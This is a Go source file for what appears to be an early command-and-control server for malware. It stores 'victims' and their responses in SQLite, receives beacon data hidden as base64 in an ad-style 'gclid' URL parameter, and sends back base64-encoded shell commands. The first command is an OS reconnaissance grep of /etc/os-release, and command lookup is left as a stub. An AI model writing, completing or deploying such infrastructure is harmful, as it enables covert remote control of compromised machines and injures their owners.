package main

import (
	"os"
	"log"
	"fmt"
	"strings"
	"net/http"
	"database/sql"
	"html/template"
	"encoding/base64"
	_ "github.com/mattn/go-sqlite3"
)

var victim *sql.DB
var logs *sql.DB
var err error

type ValueResponse struct {
  All string
}

func saveResponse(x []byte) bool{
	value := strings.Split(string(x), "==")
	fmt.Print("Valor: %s\n", value)
	err = victim.QueryRow("SELECT uid FROM victims WHERE uid = ?", value[0]).Scan(&value[0])
	fmt.Print(err)
	if err != nil {
    // Create
		// detais==ip
		addVictim, err := victim.Prepare("INSERT INTO victims (details, ip, created) VALUES (?, ?, datetime('now', 'localtime'))")
		addVictim.Exec(value[0], value[1])
		fmt.Print("New vicitm: %s\n", addVictim)
		errorStatment(err)
		return true
	} else {
    // Update
    // user id (of controller)==respose==status
		status, err := logs.Prepare("INSERT INTO logs (uid, response, status) VALUES (?, ?, ?)")
    status.Exec(value[0], value[1], value[2])
    fmt.Print("New command: %s\n", status)
    errorStatment(err)
		return false
	}
}

func queryCommand(x []byte) string {
  return "Query db for command"
}

func errorStatment(err error) {
	if err != nil {
                log.Fatal("error:", err)
        }
}

func pageAPI(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "API here")
}

func proccessData(w http.ResponseWriter, r *http.Request) {
  var command string // Command to running
  var number int // If is new sending id or if was recorded send time delay to next request
	value, err := base64.StdEncoding.DecodeString(string(r.URL.Query()["gclid"][0]))
	errorStatment(err)

  if saveResponse(value) {
    // Record
    err = victim.QueryRow("SELECT uid FROM victims ORDER BY uid DESC LIMIT 1").Scan(&number)
    command = "grep 'PRETTY_NAME' /etc/os-release"
  } else {
    // Found
    command = queryCommand(value)
    number = 0
  }
  // command==number(delay or uid)
  all := base64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s==%v", command, number)))

  response := ValueResponse{All: all}
	tmpl := template.Must(template.ParseFiles(os.Args[1]))
	tmpl.Execute(w, response)
 }

func main() {
	/*command, err := sql.Open("sqlite3", "./database/commands.db")
	errorStatment(err)*/
	// Default request from base64
	// id-database==response==status
	victim, err = sql.Open("sqlite3", "./database/victims.db")
	errorStatment(err)
	logs, err = sql.Open("sqlite3", "./database/logs.db")
	errorStatment(err)

  http.HandleFunc("/", proccessData)
	http.HandleFunc("/auth", pageAPI)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
